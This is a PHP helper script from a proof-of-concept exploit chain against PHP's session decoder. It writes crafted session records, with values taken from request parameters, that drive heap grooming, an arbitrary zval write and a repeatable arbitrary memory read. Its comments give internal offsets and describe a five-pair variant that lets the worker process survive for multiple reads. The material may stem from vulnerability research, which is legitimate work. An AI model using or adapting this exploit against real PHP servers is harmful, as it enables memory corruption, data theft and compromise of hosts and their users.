<?php
/* Warm-up for poc-a3: build the session record that the producer request
 * will be decoding when it fatals: one huge string value, so the decoder's
 * payload allocation (a zend_string the same size as the whole session)
 * deterministically exceeds memory_limit mid-decode. Same shape as a real
 * app session (application-level session_start() writing data). */
$shape = $_GET['shape'] ?? '';
$sid = $_GET['sid'] ?? 'abcdef0123456789abcdef0123456789';
if ($shape === 'w') {
    /* poc-a5 write-value session: a raw, fixed-width four-pair record
     * "k0|i:%015d;k1|i:%015d;k2|i:%015d;k3|i:%015d;". The consumer's session
     * decode hands each record pair a tmp_var() slot; the first decode's
     * steered pair writes k0's value into BG(unserialize) (a fake
     * php_unserialize_data in the groom, so the upload-progress re-decodes
     * stay on groomed state), and the re-decode's steered pairs write
     * k0/k1/k2/k3's values at the chosen target - the arbitrary zval write.
     * Fixed widths keep the request layout identical for every value;
     * parse_iv() skips leading zeros. */
    $record = sprintf('k0|i:%015d;k1|i:%015d;k2|i:%015d;k3|i:%015d;',
                      (int)($_GET['v'] ?? 0), (int)($_GET['v2'] ?? 0),
                      (int)($_GET['v3'] ?? 0), (int)($_GET['v4'] ?? 0));
    file_put_contents(rtrim(ini_get('session.save_path'), '/') . '/sess_' . $sid, $record);
    printf("session written: %d bytes\n", strlen($record));
    exit;
}
if ($shape === 'w5') {
    /* poc-a5-arbread survival variant: a FIVE-pair record. Same as 'w' but the
     * 5th pair lets the re-decode's steered write place a 0 at
     * SG(rfc1867_uploaded_files).nNumUsed (ht_post+0x50, the HashTable that sits
     * 0x38 after $_POST). With nNumUsed=0, destroy_uploaded_files_hash() loops
     * zero times at request shutdown and never dereferences the arData the a5
     * write NULL'd - so the worker SURVIVES the read (multi-read on one worker).
     * See poc/a5_arbread.py. */
    $record = sprintf('k0|i:%015d;k1|i:%015d;k2|i:%015d;k3|i:%015d;k4|i:%015d;',
                      (int)($_GET['v'] ?? 0), (int)($_GET['v2'] ?? 0),
                      (int)($_GET['v3'] ?? 0), (int)($_GET['v4'] ?? 0),
                      (int)($_GET['v5'] ?? 0));
    file_put_contents(rtrim(ini_get('session.save_path'), '/') . '/sess_' . $sid, $record);
    printf("session written: %d bytes\n", strlen($record));
    exit;
}
$mib = (int)($_GET['blob'] ?? 13); /* serialized value size in MB */
ini_set('memory_limit', '256M');
session_id($sid);
session_start();
/* Start from a clean record (leftover upload-progress keys from previous
 * consumer runs would change the decoded allocation sequence). */
$_SESSION = [];
$_SESSION['blob'] = str_repeat('A', $mib * 1000000);
$size = strlen(session_encode());
session_write_close();
printf("session written: %.1f MB\n", $size / 1048576);
